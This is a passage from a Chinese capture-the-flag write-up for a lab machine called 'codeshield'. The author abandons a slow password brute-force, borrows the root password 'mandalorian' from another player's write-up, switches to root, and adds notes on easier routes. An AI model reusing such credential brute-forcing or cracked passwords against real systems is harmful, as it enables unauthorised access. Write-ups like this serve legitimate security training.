爆破了八分钟还没出来，实在等不下去了，我直接去其他大佬那里偷了个密码`mandalorian`，撕.....这个密码在868083行，最小的都在20451行

![Image](https://github.com/user-attachments/assets/53d42048-f033-408e-b311-b7ae95f72946)

快速的切回去换root（不然你要重新双击，它复制有时间限制）

```bash
earlyp@codeshield:~/Documents$ su -
Password: 
root@codeshield:~# id
uid=0(root) gid=0(root) groups=0(root)

```

# 4.后话

去看**ll104567**大佬的wp发现，那个用户不用这么麻烦获取，你直接看他虚拟机图形化界面的登录就好了，那里全有，而且**valdezk ftp**那里，作者是让我们登录那个**web mail**查看的，不是直接看源码......
